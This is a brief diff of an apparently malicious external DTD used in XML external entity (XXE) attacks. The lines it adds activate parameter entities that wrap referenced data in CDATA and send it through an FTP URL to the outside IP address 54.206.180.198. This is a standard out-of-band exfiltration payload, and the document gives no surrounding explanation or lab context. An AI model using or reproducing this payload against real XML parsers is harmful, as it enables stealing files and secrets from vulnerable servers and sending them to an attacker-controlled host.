@@ -1,3 +1,5 @@
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://54.206.180.198/%start;%r;%end;'>">
+%c;
+%rrr;
